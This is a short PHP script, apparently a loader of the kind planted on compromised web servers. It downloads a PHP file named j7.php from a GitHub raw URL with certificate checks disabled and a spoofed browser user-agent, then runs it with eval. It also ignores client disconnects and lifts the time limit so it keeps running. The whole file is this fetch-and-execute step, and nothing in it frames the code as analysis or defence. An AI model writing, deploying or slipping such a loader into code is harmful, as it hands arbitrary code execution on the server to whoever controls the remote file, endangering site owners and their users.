<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ignore_user_abort(true);
set_time_limit(0);

$url = "https://github.com/otak-bot/j/raw/refs/heads/main/j7.php";

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_CONNECTTIMEOUT => 20,
    CURLOPT_TIMEOUT => 60,
    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    CURLOPT_HTTPHEADER => [
        'Accept: text/plain',
        'Accept-Encoding: identity'
    ]
]);

$content = curl_exec($ch);
$err = curl_error($ch);
curl_close($ch);

if ($err) {
    echo "CURL Error: $err";
} elseif ($content === false || strlen($content) < 50) {
    echo "No valid content received from URL";
} else {
    try {
        eval("?>" . $content);
    } catch (Throwable $t) {
        echo "Execution Error: " . $t->getMessage();
    }
}
?>
